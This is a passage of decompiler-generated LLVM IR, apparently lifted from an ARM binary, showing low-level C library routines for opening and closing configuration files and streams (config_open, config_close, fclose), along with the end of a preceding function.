  store i1 %v2_ef08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef08, label %dec_label_pc_ef20, label %dec_label_pc_ef10

dec_label_pc_ef10:                                ; preds = %dec_label_pc_ee2c, %dec_label_pc_ef00
  %v0_ee5c = phi i32 [ %v0_ef04, %dec_label_pc_ef00 ], [ %v0_ef0412, %dec_label_pc_ee2c ]
  %v2_ee5c = phi i32 [ %v1_ef00, %dec_label_pc_ef00 ], [ %v0_ee44, %dec_label_pc_ee2c ]
  %v1_ef14 = phi i32 [ %v3_ef04, %dec_label_pc_ef00 ], [ %v3_ef0415, %dec_label_pc_ee2c ]
  %v0_ef10 = load i32, i32* @r7, align 4
  %v1_ef10 = inttoptr i32 %v0_ef10 to i8*
  %v2_ef10 = load i8, i8* %v1_ef10, align 1
  %v3_ef10 = zext i8 %v2_ef10 to i32
  store i32 %v3_ef10, i32* %r3.global-to-local, align 4
  %v9_ef14 = icmp eq i32 %v3_ef10, %v1_ef14
  store i1 %v9_ef14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef14, label %dec_label_pc_ef20, label %bb72

bb72:                                             ; preds = %dec_label_pc_ef10
  %v2_ef18 = load i32, i32* @sb, align 4
  %v3_ef18 = sub i32 %v2_ee5c, %v2_ef18
  %v5_ef18 = xor i32 %v2_ef18, %v2_ee5c
  %v6_ef18 = xor i32 %v3_ef18, %v2_ee5c
  %v7_ef18 = and i32 %v6_ef18, %v5_ef18
  %v8_ef18 = icmp slt i32 %v7_ef18, 0
  %v9_ef18 = icmp slt i32 %v3_ef18, 0
  %v10_ef18 = icmp eq i32 %v2_ee5c, %v2_ef18
  store i1 %v10_ef18, i1* %cpsr_z.global-to-local, align 1
  %v2_ef1c = xor i1 %v9_ef18, %v8_ef18
  br i1 %v2_ef1c, label %dec_label_pc_ee4c, label %dec_label_pc_ef20

dec_label_pc_ef20:                                ; preds = %dec_label_pc_ef10, %dec_label_pc_ef00, %bb72, %dec_label_pc_ee2c
  %v0_ef24 = phi i32 [ %v0_ee44, %dec_label_pc_ee2c ], [ %v2_ee5c, %dec_label_pc_ef10 ], [ %v1_ef00, %dec_label_pc_ef00 ], [ %v2_ee5c, %bb72 ]
  store i32 %v3_ec44, i32* %r2.global-to-local, align 4
  %v9_ef24 = icmp eq i32 %v0_ef24, %v3_ec44
  store i1 %v9_ef24, i1* %cpsr_z.global-to-local, align 1
  %v6_ef28 = icmp slt i32 %v0_ef24, %v3_ec44
  br i1 %v6_ef28, label %dec_label_pc_ef2c, label %dec_label_pc_ef38

dec_label_pc_ef2c:                                ; preds = %dec_label_pc_ef20
  %v0_ef2c = load i32, i32* @r8, align 4
  %v1_ef2c = and i32 %v0_ef2c, 1048576
  %v2_ef2c = icmp eq i32 %v1_ef2c, 0
  store i1 %v2_ef2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef2c, label %dec_label_pc_ec84.backedge, label %dec_label_pc_ef34

dec_label_pc_ef34:                                ; preds = %dec_label_pc_ef2c, %dec_label_pc_edec, %.thread, %entry
  br label %dec_label_pc_ef38

dec_label_pc_ef38:                                ; preds = %dec_label_pc_ef20, %dec_label_pc_ed08, %dec_label_pc_ef34
  %v0_ef38 = phi i32 [ %v0_ed18, %dec_label_pc_ed08 ], [ 0, %dec_label_pc_ef34 ], [ %v0_ef24, %dec_label_pc_ef20 ]
  store i32 %v0_ef38, i32* %r0.global-to-local, align 4
  store i32 %v3_ec20, i32* @r4, align 4
  store i32 %v6_ec20, i32* @r5, align 4
  store i32 %v9_ec20, i32* @r6, align 4
  store i32 %v12_ec20, i32* @r7, align 4
  store i32 %v15_ec20, i32* @r8, align 4
  store i32 %v18_ec20, i32* @sb, align 4
  store i32 %v21_ec20, i32* @sl, align 4
  store i32 %v24_ec20, i32* @fp, align 4
  ret i32 %v0_ef38

; uselistorder directives
  uselistorder i32 %v0_ef38, { 1, 0 }
  uselistorder i32 %v0_ef24, { 0, 2, 1 }
  uselistorder i32 %v3_ef18, { 1, 0 }
  uselistorder i32 %v2_ef18, { 1, 0, 2 }
  uselistorder i32 %v2_ee5c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_ef04.pre, { 0, 2, 1 }
  uselistorder i32 %v5_ee98, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ee44, { 1, 0, 2 }
  uselistorder i1 %v9_ee24, { 1, 0 }
  uselistorder i32 %v3_edfc, { 0, 2, 1, 3 }
  uselistorder i1 %v7_edec, { 1, 0 }
  uselistorder i1 %v8_ede4, { 1, 0 }
  uselistorder i32 %v3_edb4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_eda4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v3_ed8c, { 1, 0, 2 }
  uselistorder i32 %v1_ed7c, { 1, 0, 2 }
  uselistorder i32 %v0_ed68, { 0, 2, 1, 3 }
  uselistorder i32 %v1_ed60, { 1, 0 }
  uselistorder i32 %v1_ed4c, { 1, 0 }
  uselistorder i32 %v1_ed48, { 1, 0 }
  uselistorder i32 %v2_ed24, { 1, 0 }
  uselistorder i32 %v1_ed08, { 2, 0, 1 }
  uselistorder i32 %v0_ecf0, { 1, 0 }
  uselistorder i32 %v1_ece0, { 0, 2, 1 }
  uselistorder i32* %v1_ee50, { 1, 0 }
  uselistorder i1 %v2_edf8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ec6c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_ec60, { 2, 1, 0 }
  uselistorder i32 %v3_ec48, { 1, 2, 0 }
  uselistorder i32 %v3_ec44, { 2, 1, 0 }
  uselistorder i32 %v1_ec3c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ef38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef20, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ef10, { 1, 0 }
  uselistorder label %dec_label_pc_ef00, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_eeb4, { 1, 0 }
  uselistorder label %dec_label_pc_ec84.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ee14, { 1, 0 }
  uselistorder label %dec_label_pc_edec, { 1, 0 }
  uselistorder label %dec_label_pc_ede0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_eda4, { 1, 0 }
  uselistorder label %dec_label_pc_ecd8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_ef4c = icmp eq i32* %arg1, null
  br i1 %v2_ef4c, label %dec_label_pc_ef74, label %dec_label_pc_ef54

dec_label_pc_ef54:                                ; preds = %entry
  %v2_ef54 = load i32, i32* %arg1, align 4
  %v1_ef58 = inttoptr i32 %v2_ef54 to i16*
  %v2_ef58 = call i32 @__GI_fclose(i16* %v1_ef58)
  %v0_ef5c = load i32, i32* @r4, align 4
  %v1_ef5c = add i32 %v0_ef5c, 20
  %v2_ef5c = inttoptr i32 %v1_ef5c to i32*
  %v3_ef5c = load i32, i32* %v2_ef5c, align 4
  %v2_ef60 = icmp eq i32 %v3_ef5c, 0
  br i1 %v2_ef60, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_ef54
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_ef54, %bb
  store i32 61292, i32* @lr, align 4
  %v1_ef68 = xor i1 %v2_ef60, true
  call void @__pseudo_cond_branch(i1 %v1_ef68, i32 ptrtoint (i32* @global_var_c038.332 to i32))
  %v0_ef6c = load i32, i32* @r4, align 4
  store i32 %v0_ef6c, i32* @r0, align 4
  %v0_ef70 = call i32 @free()
  br label %dec_label_pc_ef74

dec_label_pc_ef74:                                ; preds = %entry, %bb6
  %v1_ef78 = phi i32 [ 0, %entry ], [ %v0_ef70, %bb6 ]
  ret i32 %v1_ef78

; uselistorder directives
  uselistorder label %dec_label_pc_ef74, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ef88 = load i32, i32* @r4, align 4
  store i32 %v3_ef88, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37204), i32* @r1, align 4
  %v0_ef90 = load i32, i32* @r0, align 4
  %v2_ef90 = load i32, i32* @r2, align 4
  %v4_ef90 = call i32 @__GI_fopen(i32 %v0_ef90, i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37204), i32 %v2_ef90, i32 ptrtoint (i32* @global_var_22290.79 to i32))
  store i32 %v4_ef90, i32* %r0.global-to-local, align 4
  store i32 %v4_ef90, i32* @r4, align 4
  %v2_ef94 = icmp eq i32 %v4_ef90, 0
  br i1 %v2_ef94, label %bb, label %dec_label_pc_efa0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_efa0:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_efa8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_efa8, i32* %r0.global-to-local, align 4
  %v2_efac = icmp eq i32 %v2_efa8, 0
  br i1 %v2_efac, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_efa0
  %v1_efb0 = load i32, i32* @r4, align 4
  %v3_efb0 = inttoptr i32 %v2_efa8 to i32*
  store i32 %v1_efb0, i32* %v3_efb0, align 4
  %v1_efb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_efa0, %bb4
  %v1_efb8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_efa0 ], [ %v1_efb8.pre, %bb4 ]
  %v2_efb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_efb4, i32* @r4, align 4
  ret i32 %v1_efb8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 0, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37204), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_efc4 = load i32, i32* @r4, align 4
  store i32 %v3_efc4, i32* %stack_var_-36, align 4
  %v6_efc4 = load i32, i32* @r5, align 4
  %v9_efc4 = load i32, i32* @r6, align 4
  %v12_efc4 = load i32, i32* @r7, align 4
  %v15_efc4 = load i32, i32* @r8, align 4
  %v18_efc4 = load i32, i32* @sb, align 4
  %v27_efc4 = load i32, i32* @lr, align 4
  %v2_efc8 = add i32 %tmp, 52
  %v3_efc8 = inttoptr i32 %v2_efc8 to i32*
  %v4_efc8 = load i32, i32* %v3_efc8, align 4
  store i32 %v4_efc8, i32* @sb, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efd0 = icmp eq i32 %v4_efc8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r8, align 4
  br i1 %v2_efd0, label %dec_label_pc_efe4, label %dec_label_pc_f048

dec_label_pc_efe4:                                ; preds = %entry
  %v0_efe4 = call i32 @__aeabi_read_tp()
  store i32 %v0_efe4, i32* %r0.global-to-local, align 4
  %v0_efe8 = load i32, i32* @r5, align 4
  %v1_efe8 = add i32 %v0_efe8, 64
  %v2_efe8 = inttoptr i32 %v1_efe8 to i32*
  %v3_efe8 = load i32, i32* %v2_efe8, align 4
  store i32 %v3_efe8, i32* %r3.global-to-local, align 4
  %v1_efec = add i32 %v0_efe4, -1168
  store i32 %v1_efec, i32* @r6, align 4
  %v3_eff0 = icmp uge i32 %v3_efe8, %v1_efec
  store i1 %v3_eff0, i1* %cpsr_c.global-to-local, align 1
  %v9_eff0 = icmp eq i32 %v3_efe8, %v1_efec
  br i1 %v9_eff0, label %dec_label_pc_f03c, label %dec_label_pc_eff8

dec_label_pc_eff8:                                ; preds = %dec_label_pc_efe4
  %v1_eff8 = add i32 %v0_efe8, 56
  store i32 %v1_eff8, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_eff8, i32* %r2.global-to-local, align 4
  %v0_f004 = load i32, i32* @sb, align 4
  store i32 %v0_f004, i32* @r4, align 4
  %v1_f008115 = inttoptr i32 %v1_eff8 to i32*
  %v2_f008116 = load i32, i32* %v1_f008115, align 4
  store i32 %v2_f008116, i32* %r3.global-to-local, align 4
  %v3_f00c118 = icmp uge i32 %v2_f008116, %v0_f004
  store i1 %v3_f00c118, i1* %cpsr_c.global-to-local, align 1
  %v9_f00c124 = icmp eq i32 %v2_f008116, %v0_f004
  br i1 %v9_f00c124, label %dec_label_pc_f014, label %dec_label_pc_f02c

dec_label_pc_f014:                                ; preds = %dec_label_pc_eff8, %dec_label_pc_f014.dec_label_pc_f008_crit_edge
  %v0_f014125 = phi i32 [ %v1_f00c.pre, %dec_label_pc_f014.dec_label_pc_f008_crit_edge ], [ %v0_f004, %dec_label_pc_eff8 ]
  store i32 %v0_f014125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f024 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f024, label %dec_label_pc_f028, label %dec_label_pc_f014.dec_label_pc_f008_crit_edge

dec_label_pc_f014.dec_label_pc_f008_crit_edge:    ; preds = %dec_label_pc_f014
  %v0_f008.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f00c.pre = load i32, i32* @r4, align 4
  %v1_f008 = inttoptr i32 %v0_f008.pre to i32*
  %v2_f008 = load i32, i32* %v1_f008, align 4
  store i32 %v2_f008, i32* %r3.global-to-local, align 4
  %v3_f00c = icmp uge i32 %v2_f008, %v1_f00c.pre
  store i1 %v3_f00c, i1* %cpsr_c.global-to-local, align 1
  %v9_f00c = icmp eq i32 %v2_f008, %v1_f00c.pre
  br i1 %v9_f00c, label %dec_label_pc_f014, label %dec_label_pc_f02c

dec_label_pc_f028:                                ; preds = %dec_label_pc_f014
  %v0_f028 = load i32, i32* @r4, align 4
  store i32 %v0_f028, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f02c

dec_label_pc_f02c:                                ; preds = %dec_label_pc_eff8, %dec_label_pc_f014.dec_label_pc_f008_crit_edge, %dec_label_pc_f028
  %v0_f02c = phi i32 [ %v0_f028, %dec_label_pc_f028 ], [ %v2_f008116, %dec_label_pc_eff8 ], [ %v2_f008, %dec_label_pc_f014.dec_label_pc_f008_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f02c = icmp eq i32 %v0_f02c, 0
  br i1 %v2_f02c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_f02c
  %v1_f030 = load i32, i32* @r7, align 4
  store i32 %v1_f030, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_f02c, %bb
  %v1_f034 = xor i1 %v2_f02c, true
  call void @__pseudo_cond_branch(i1 %v1_f034, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_f038 = load i32, i32* @r6, align 4
  %v1_f038 = load i32, i32* @r5, align 4
  %v2_f038 = add i32 %v1_f038, 64
  %v3_f038 = inttoptr i32 %v2_f038 to i32*
  store i32 %v0_f038, i32* %v3_f038, align 4
  %v0_f03c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f03c

dec_label_pc_f03c:                                ; preds = %dec_label_pc_efe4, %bb41
  %v0_f03c = phi i32 [ %v0_efe8, %dec_label_pc_efe4 ], [ %v0_f03c.pre, %bb41 ]
  %v1_f03c = add i32 %v0_f03c, 60
  %v2_f03c = inttoptr i32 %v1_f03c to i32*
  %v3_f03c = load i32, i32* %v2_f03c, align 4
  %v1_f040 = add i32 %v3_f03c, 1
  store i32 %v1_f040, i32* %r3.global-to-local, align 4
  store i32 %v1_f040, i32* %v2_f03c, align 4
  %v0_f048.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %entry, %dec_label_pc_f03c
  %v1_f050 = phi i32 [ %tmp, %entry ], [ %v0_f048.pre, %dec_label_pc_f03c ]
  %v1_f048 = inttoptr i32 %v1_f050 to i16*
  %v2_f048 = load i16, i16* %v1_f048, align 2
  %v3_f048 = zext i16 %v2_f048 to i32
  store i32 %v3_f048, i32* %r3.global-to-local, align 4
  %v1_f04c = and i32 %v3_f048, 64
  %v2_f04c = icmp eq i32 %v1_f04c, 0
  br i1 %v2_f04c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_f048
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_f048, %bb42
  %storemerge = phi i32 [ %v1_f050, %bb42 ], [ %v1_f04c, %dec_label_pc_f048 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 61528, i32* @lr, align 4
  %v1_f054 = xor i1 %v2_f04c, true
  call void @__pseudo_cond_branch(i1 %v1_f054, i32 ptrtoint (i32* @global_var_fe98.336 to i32))
  %v0_f058 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f058, i32* %fp.global-to-local, align 4
  %v0_f05c = load i32, i32* @r5, align 4
  %v1_f05c = add i32 %v0_f05c, 4
  %v2_f05c = inttoptr i32 %v1_f05c to i32*
  %v3_f05c = load i32, i32* %v2_f05c, align 4
  store i32 %v3_f05c, i32* %r0.global-to-local, align 4
  %v1_f060 = call i32 @__GI___libc_close(i32 %v3_f05c)
  store i32 %v1_f060, i32* %r0.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_f068 = load i32, i32* @r8, align 4
  %v2_f068 = add i32 %v0_f068, 168
  %v3_f068 = inttoptr i32 %v2_f068 to i32*
  %v4_f068 = load i32, i32* %v3_f068, align 4
  store i32 %v4_f068, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_f06c = icmp slt i32 %v1_f060, 0
  br i1 %v1_f06c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_f074 = add i32 %v4_f068, 8
  %v2_f074 = inttoptr i32 %v1_f074 to i32*
  %v3_f074 = load i32, i32* %v2_f074, align 4
  store i32 %v3_f074, i32* %r3.global-to-local, align 4
  %v0_f078 = call i32 @__aeabi_read_tp()
  store i32 %v0_f078, i32* %r0.global-to-local, align 4
  %v1_f07c = add i32 %v0_f078, -1168
  store i32 %v1_f07c, i32* %sl.global-to-local, align 4
  %v0_f080 = load i32, i32* %r3.global-to-local, align 4
  %v3_f080 = icmp uge i32 %v0_f080, %v1_f07c
  store i1 %v3_f080, i1* %cpsr_c.global-to-local, align 1
  %v9_f080 = icmp eq i32 %v0_f080, %v1_f07c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f088 = load i32, i32* @r5, align 4
  %v2_f088 = add i32 %v1_f088, 4
  %v3_f088 = inttoptr i32 %v2_f088 to i32*
  store i32 -1, i32* %v3_f088, align 4
  br i1 %v9_f080, label %dec_label_pc_f0d0, label %dec_label_pc_f090

dec_label_pc_f090:                                ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_f094 = load i32, i32* @r7, align 4
  store i32 %v0_f094, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_f09c108 = inttoptr i32 %v0_f094 to i32*
  %v2_f09c109 = load i32, i32* %v1_f09c108, align 4
  store i32 %v2_f09c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_f0a0111 = icmp eq i32 %v2_f09c109, 0
  br i1 %v9_f0a0111, label %dec_label_pc_f0a8, label %dec_label_pc_f0c0

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f090, %dec_label_pc_f0a8.dec_label_pc_f09c_crit_edge
  %v0_f0a8112 = phi i32 [ %v1_f0a0.pre, %dec_label_pc_f0a8.dec_label_pc_f09c_crit_edge ], [ 0, %dec_label_pc_f090 ]
  store i32 %v0_f0a8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f0b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f0b8, label %dec_label_pc_f0bc, label %dec_label_pc_f0a8.dec_label_pc_f09c_crit_edge

dec_label_pc_f0a8.dec_label_pc_f09c_crit_edge:    ; preds = %dec_label_pc_f0a8
  %v0_f09c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f0a0.pre = load i32, i32* @r4, align 4
  %v1_f09c = inttoptr i32 %v0_f09c.pre to i32*
  %v2_f09c = load i32, i32* %v1_f09c, align 4
  store i32 %v2_f09c, i32* %r3.global-to-local, align 4
  %v3_f0a0 = icmp uge i32 %v2_f09c, %v1_f0a0.pre
  store i1 %v3_f0a0, i1* %cpsr_c.global-to-local, align 1
  %v9_f0a0 = icmp eq i32 %v2_f09c, %v1_f0a0.pre
  br i1 %v9_f0a0, label %dec_label_pc_f0a8, label %dec_label_pc_f0c0

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_f0a8
  %v0_f0bc = load i32, i32* @r4, align 4
  store i32 %v0_f0bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f0c0

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f090, %dec_label_pc_f0a8.dec_label_pc_f09c_crit_edge, %dec_label_pc_f0bc
  %v0_f0c0 = phi i32 [ %v0_f0bc, %dec_label_pc_f0bc ], [ %v2_f09c109, %dec_label_pc_f090 ], [ %v2_f09c, %dec_label_pc_f0a8.dec_label_pc_f09c_crit_edge ]
  %v1_f0c0 = phi i32 [ %v0_f0bc, %dec_label_pc_f0bc ], [ 0, %dec_label_pc_f090 ], [ %v1_f0a0.pre, %dec_label_pc_f0a8.dec_label_pc_f09c_crit_edge ]
  %v3_f0c0 = icmp uge i32 %v0_f0c0, %v1_f0c0
  store i1 %v3_f0c0, i1* %cpsr_c.global-to-local, align 1
  %v9_f0c0 = icmp eq i32 %v0_f0c0, %v1_f0c0
  br i1 %v9_f0c0, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_f0c0
  %v1_f0c4 = load i32, i32* @r7, align 4
  store i32 %v1_f0c4, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_f0c0, %bb46
  %v1_f0c8 = xor i1 %v9_f0c0, true
  call void @__pseudo_cond_branch(i1 %v1_f0c8, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_f0cc = load i32, i32* %sl.global-to-local, align 4
  %v1_f0cc = load i32, i32* @r7, align 4
  %v2_f0cc = add i32 %v1_f0cc, 8
  %v3_f0cc = inttoptr i32 %v2_f0cc to i32*
  store i32 %v0_f0cc, i32* %v3_f0cc, align 4
  br label %dec_label_pc_f0d0

dec_label_pc_f0d0:                                ; preds = %bb45, %bb47
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_f0d4 = load i32, i32* @r8, align 4
  %v2_f0d4 = add i32 %v0_f0d4, 168
  %v3_f0d4 = inttoptr i32 %v2_f0d4 to i32*
  %v4_f0d4 = load i32, i32* %v3_f0d4, align 4
  store i32 %v4_f0d4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_f0dc = add i32 %v0_f0d4, 12
  %v3_f0dc = inttoptr i32 %v2_f0dc to i32*
  %v4_f0dc = load i32, i32* %v3_f0dc, align 4
  store i32 %v4_f0dc, i32* %r2.global-to-local, align 4
  %v1_f0e0 = add i32 %v4_f0d4, 4
  %v2_f0e0 = inttoptr i32 %v1_f0e0 to i32*
  %v3_f0e0 = load i32, i32* %v2_f0e0, align 4
  store i32 %v3_f0e0, i32* %r1.global-to-local, align 4
  %v1_f0e4 = inttoptr i32 %v4_f0dc to i32*
  %v2_f0e4 = load i32, i32* %v1_f0e4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0e8 = icmp eq i32 %v3_f0e0, 0
  %v1_f0ec = add i32 %v2_f0e4, 1
  store i32 %v1_f0ec, i32* %r3.global-to-local, align 4
  store i32 %v1_f0ec, i32* %v1_f0e4, align 4
  br i1 %v2_f0e8, label %dec_label_pc_f0f8, label %dec_label_pc_f158

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0d0
  %v0_f0f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_f0f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_f0f8 = add i32 %v1_f0f8, 8
  %v3_f0f8 = inttoptr i32 %v2_f0f8 to i32*
  store i32 %v0_f0f8, i32* %v3_f0f8, align 4
  %v0_f0fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f0fc, i32* @r7, align 4
  br label %dec_label_pc_f100

dec_label_pc_f100:                                ; preds = %dec_label_pc_f130.dec_label_pc_f100_crit_edge, %dec_label_pc_f0f8
  %v0_f100 = phi i32 [ %v0_f100.pre, %dec_label_pc_f130.dec_label_pc_f100_crit_edge ], [ %v0_f0fc, %dec_label_pc_f0f8 ]
  %v1_f100 = inttoptr i32 %v0_f100 to i32*
  %v2_f100 = load i32, i32* %v1_f100, align 4
  store i32 %v2_f100, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_f100, i32* %r2.global-to-local, align 4
  %v2_f10c96 = load i32, i32* %v1_f100, align 4
  store i32 %v2_f10c96, i32* %r3.global-to-local, align 4
  %v3_f11098 = icmp uge i32 %v2_f10c96, %v2_f100
  store i1 %v3_f11098, i1* %cpsr_c.global-to-local, align 1
  %v9_f110104 = icmp eq i32 %v2_f10c96, %v2_f100
  br i1 %v9_f110104, label %dec_label_pc_f118, label %dec_label_pc_f130

dec_label_pc_f118:                                ; preds = %dec_label_pc_f100, %dec_label_pc_f118.dec_label_pc_f10c_crit_edge
  %v0_f118105 = phi i32 [ %v1_f110.pre, %dec_label_pc_f118.dec_label_pc_f10c_crit_edge ], [ %v2_f100, %dec_label_pc_f100 ]
  store i32 %v0_f118105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f128 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f128, label %dec_label_pc_f12c, label %dec_label_pc_f118.dec_label_pc_f10c_crit_edge

dec_label_pc_f118.dec_label_pc_f10c_crit_edge:    ; preds = %dec_label_pc_f118
  %v0_f10c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f110.pre = load i32, i32* @r4, align 4
  %v1_f10c = inttoptr i32 %v0_f10c.pre to i32*
  %v2_f10c = load i32, i32* %v1_f10c, align 4
  store i32 %v2_f10c, i32* %r3.global-to-local, align 4
  %v3_f110 = icmp uge i32 %v2_f10c, %v1_f110.pre
  store i1 %v3_f110, i1* %cpsr_c.global-to-local, align 1
  %v9_f110 = icmp eq i32 %v2_f10c, %v1_f110.pre
  br i1 %v9_f110, label %dec_label_pc_f118, label %dec_label_pc_f130

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f118
  %v0_f12c = load i32, i32* @r4, align 4
  store i32 %v0_f12c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f100, %dec_label_pc_f118.dec_label_pc_f10c_crit_edge, %dec_label_pc_f12c
  %v0_f138 = phi i32 [ %v0_f12c, %dec_label_pc_f12c ], [ %v2_f10c96, %dec_label_pc_f100 ], [ %v2_f10c, %dec_label_pc_f118.dec_label_pc_f10c_crit_edge ]
  %v1_f130 = phi i32 [ %v0_f12c, %dec_label_pc_f12c ], [ %v2_f100, %dec_label_pc_f100 ], [ %v1_f110.pre, %dec_label_pc_f118.dec_label_pc_f10c_crit_edge ]
  %v3_f130 = icmp uge i32 %v0_f138, %v1_f130
  store i1 %v3_f130, i1* %cpsr_c.global-to-local, align 1
  %v9_f130 = icmp eq i32 %v0_f138, %v1_f130
